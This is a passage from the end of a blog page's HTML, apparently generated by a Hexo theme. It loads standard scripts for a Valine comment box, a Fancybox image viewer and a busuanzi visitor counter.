class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
